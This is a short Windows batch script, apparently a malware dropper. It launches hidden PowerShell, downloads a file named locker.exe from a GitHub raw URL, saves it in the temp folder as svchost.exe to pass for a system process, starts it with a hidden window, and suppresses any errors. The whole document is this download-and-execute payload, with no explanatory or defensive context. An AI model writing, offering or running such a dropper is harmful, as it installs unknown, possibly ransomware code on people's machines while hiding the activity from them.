@echo off
powershell -WindowStyle Hidden -Command "try{$w=New-Object Net.WebClient;$w.DownloadFile('https://raw.githubusercontent.com/R0TA3/locker-test/main/locker.exe','%TEMP%\svchost.exe');start '%TEMP%\svchost.exe' -WindowStyle Hidden}catch{}"
